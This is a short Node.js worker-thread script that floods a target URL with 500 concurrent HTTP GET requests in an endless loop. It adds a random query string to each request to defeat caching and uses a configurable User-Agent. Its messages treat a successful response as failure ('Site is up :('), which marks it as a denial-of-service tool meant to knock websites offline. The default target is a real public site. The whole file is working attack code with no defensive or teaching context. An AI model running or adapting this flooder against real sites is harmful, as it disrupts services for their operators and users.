let { parentPort, workerData } = require('worker_threads');
const axios = require('axios');

workerData = workerData ?? {
    url: 'https://www.google.com/',
    concurrency: 500,
    userAgent: 'AXIOS Client: 1.1.3',
};

parentPort = parentPort ?? {
    postMessage: console.log.bind(console, 'MESSAGE')
};

const browser = axios.create({
    headers: {
        'User-Agent': workerData.userAgent,
    }
});

(async () => {
    while (true) {
        try {
            const promises = [];
            for (let i = 0; i < workerData.concurrency; i++) {
                promises.push(browser.get(`${workerData.url}?_ts=${Math.random().toString(36).substring(2, 5)}`).then(() =>
                    parentPort.postMessage('Site is up :(')));
            }
            parentPort.postMessage(`Firing ${workerData.concurrency} requests to ${workerData.url} as ${workerData.userAgent} ...`);
            await Promise.allSettled(promises);
            parentPort.postMessage(`Completed ${workerData.concurrency} requests ...`);
        } catch (err) {
            parentPort.postMessage(`ERROR ${err}`);
            break;
        }
    }
})().catch((err) => parentPort.postMessage(err));